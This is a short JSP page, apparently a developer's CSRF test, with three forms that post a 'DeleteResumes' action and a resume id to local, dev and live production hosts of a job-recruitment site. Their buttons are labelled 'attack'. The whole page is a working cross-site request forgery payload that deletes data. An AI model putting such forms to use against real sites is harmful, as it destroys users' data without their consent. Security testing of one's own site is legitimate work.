<%--
  Created by IntelliJ IDEA.
  User: Willow
  Date: 12/21/16
  Time: 16:39
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>测试SCRF攻击</title>
</head>
<body>
<h2>测试本地</h2>
<form action="http://local.jobmd.cn/user/resume.do" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack local">
</form>
<h2>测试线下</h2>
<form action="http://www.jobmd.net/user/resume.do" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack dev">
</form>
<h2>测试线上</h2>
<form action="http://www.jobmd.cn/user/resume.do" method="post">
    <input hidden type="text" name="action" value="DeleteResumes">
    <input type="text" name="id" value="2574041">
    <input type="submit" value="attack online">
</form>
</body>
</html>
